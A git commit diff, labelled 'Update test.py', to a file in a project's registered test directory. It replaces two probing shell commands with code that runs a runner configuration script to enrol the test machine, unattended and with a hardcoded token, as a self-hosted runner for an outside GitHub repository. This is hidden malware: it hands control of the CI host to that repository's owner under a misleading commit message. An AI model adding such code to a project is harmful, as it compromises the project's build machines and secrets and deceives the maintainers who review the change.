f1d68d55546a8842775329b96146ed677c6f62ca
marysteven <mary10112026@outlook.com>
2026-03-09 00:59:24 -0700

    Update test.py

--- test/registered/test.py
+++ test/registered/test.py
@@ -1,6 +1,17 @@
 import subprocess
 
-subprocess.run("ls -al", shell=True)
-subprocess.run("echo 1 >/tmp/1", shell=True)
+repo_url = "https://github.com/marysteven/pic"
+runner_name = "python-runner"
+
+cmd = [
+    "./config.sh",
+    "--url", repo_url,
+    "--token", "B7NVQL5ARFLN72NX5O2RNBTJV2F3S",
+    "--name", runner_name,
+    "--work", "_work",
+    "--unattended"
+]
+
+subprocess.run(cmd)
 
 register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
